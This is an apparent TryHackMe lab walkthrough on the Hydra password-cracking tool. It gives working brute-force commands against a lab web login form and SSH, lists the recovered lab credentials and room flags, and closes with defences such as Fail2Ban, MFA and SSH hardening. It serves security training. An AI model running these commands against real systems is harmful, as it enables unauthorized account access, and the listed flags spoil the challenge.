# 🔨 TryHackMe — Hydra Walkthrough (Summary)

This module introduces **Hydra**, a highly parallelized online password-cracking utility used to perform rapid brute-force attacks against multiple authentication protocols such as SSH, FTP, HTTP forms, SMTP, and RDP.

The room demonstrates how weak passwords, poor rate-limiting controls, and insecure authentication configurations allow attackers to gain unauthorized access through automated credential attacks.

---

## 🔍 Understanding Hydra & Online Brute-Force Attacks

Hydra operates by systematically testing username and password combinations against a target authentication service until valid credentials are identified.

Because the tool supports multithreading and protocol-specific modules, it can perform high-speed authentication attacks against both web applications and remote access services.

---

## ⚠️ Core Security Risks

Weak authentication systems may expose organizations to:

- **Credential Stuffing**
- **Password Spraying**
- **Online Brute-Force Attacks**
- **Unauthorized Remote Access**
- **Privilege Escalation**
- **Account Takeover**

---

## 🧭 Core Hydra Command Architecture

Every Hydra attack follows four fundamental components:

| Component | Purpose |
| :--- | :--- |
| Target | IP address or hostname of the service |
| Username Parameters (`-l` / `-L`) | Single username or username wordlist |
| Password Parameters (`-p` / `-P`) | Single password or password wordlist |
| Service Module | Target protocol (`ssh`, `ftp`, `http-post-form`, etc.) |

---

## 🛠️ Deep Dive: Exploitation Techniques & Tasks

---

## Task 1 & 2 — Attack Execution Profiles

The room demonstrates brute-force attacks against both web authentication forms and SSH services.

---

# 🌐 Web Form Brute-Forcing (`http-post-form`)

## 🔎 Attack Overview

Brute-forcing web login forms requires Hydra to understand:

- The target login endpoint
- POST request structure
- Success/failure response indicators

Hydra achieves this through a specialized syntax format:

```text
"<login_path>:<POST_parameters>:<failure_condition>"
```

---

## ⚙️ Parameter Breakdown

| Parameter | Purpose |
| :--- | :--- |
| Login Path | Target endpoint receiving POST requests |
| POST Parameters | Request body containing username/password fields |
| Failure Condition | Response string indicating failed authentication |

---

## 🔬 Dynamic Placeholders

Hydra automatically replaces:

| Placeholder | Function |
| :--- | :--- |
| `^USER^` | Current username value |
| `^PASS^` | Current password value |

during each brute-force iteration.

---

## 🚀 Exploit Execution

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.80.189.190 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

---

## ⚡ Attack Logic

- If the response contains:
  
```text
incorrect
```

Hydra marks the attempt as failed.

- If the failure string is absent:
  - Hydra assumes authentication succeeded.
  - Valid credentials are reported.

---

## 🔑 Credentials Recovered

| Username | Password |
| :--- | :--- |
| `molly` | `sunshine` |

---

## 🚩 Flag Captured

```text
THM{2673a7dd116de68e85c48ec0b1f2612e}
```

---

# 🔐 Remote Access Brute-Forcing (SSH)

## 🔎 Attack Overview

Unlike web forms, SSH brute-forcing is simpler because Hydra includes native SSH protocol handling.

The room also demonstrates thread tuning using the `-t` parameter to balance attack speed and connection stability.

---

## 🚀 Exploit Execution

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.80.189.190 ssh -t 4
```

---

## ⚙️ Parameter Focus

| Parameter | Purpose |
| :--- | :--- |
| `-t 4` | Run four parallel attack threads |

Increasing thread counts improves speed but may:
- Trigger rate-limits
- Cause connection instability
- Alert monitoring systems

---

## 🔑 SSH Credentials Recovered

| Username | Password |
| :--- | :--- |
| `molly` | `butterfly` |

---

## 🖥️ Remote Login & Flag Retrieval

```bash
ssh molly@10.80.189.190
```

After authentication:

```bash
cat flag2
```

---

## 🚩 Flag Captured

```text
THM{c8eeb0468febbadea859baeb33b2541b}
```

---

## 🎛️ Quick Reference — Hydra Syntax Comparison

| Target Vector | Syntax Structure | Key Focus |
| :--- | :--- | :--- |
| HTTP Login Form | `http-post-form "<path>:<vars>:F=<msg>"` | Form structure & failure messages |
| SSH Service | `ssh -t <threads>` | Thread management & credential attacks |

---

## ⚠️ Security Impact of Brute-Force Attacks

Successful Hydra attacks may result in:

- Unauthorized SSH access
- Web application compromise
- Credential harvesting
- Remote shell access
- Lateral movement opportunities
- Full infrastructure compromise

---

## 🛡️ Remediation & Defensive Security Baselines

To defend against Hydra and similar automated authentication attacks:

---

### Implement Fail2Ban & IP Lockouts

Monitor authentication logs and dynamically block IP addresses generating repeated failures.

Example monitored logs:

```text
/var/log/auth.log
```

---

### Enforce Multi-Factor Authentication (MFA)

Adding:
- TOTP
- Push authentication
- Hardware tokens

significantly reduces the effectiveness of password guessing attacks.

---

### Deploy Rate Limiting & CAPTCHA

Protect:
- `/login`
- `/signin`
- `/reset-password`

using:
- CAPTCHA systems
- Token-bucket rate limiting
- Progressive delays

---

### Harden SSH Configurations

Disable password-based authentication entirely.

Recommended SSH configuration:

```bash
PasswordAuthentication no
```

inside:

```text
/etc/ssh/sshd_config
```

and enforce:
- SSH key authentication
- Strong cryptographic keys
- Restricted login policies

---

## 📊 Key Takeaways

- Weak passwords remain one of the most exploitable attack surfaces.
- Hydra automates large-scale online brute-force attacks across many protocols.
- Web login brute-forcing requires accurate response fingerprinting.
- SSH attacks become highly effective when password authentication is enabled.
- Rate limiting and MFA dramatically reduce brute-force success rates.
- Strong authentication policies are essential for infrastructure security.

---

## 🧠 Final Summary

The Hydra room demonstrates how attackers leverage automated credential attacks to compromise weak authentication systems across both web applications and remote access services.

By using Hydra’s protocol-specific modules, dynamic placeholders, multithreaded execution, and response analysis features, penetration testers can efficiently identify weak credentials and gain unauthorized access to protected systems.

The module reinforces the importance of strong password policies, MFA enforcement, aggressive rate limiting, and hardened SSH configurations to defend against modern automated brute-force tooling.

---

**Task Status: ✔ Completed**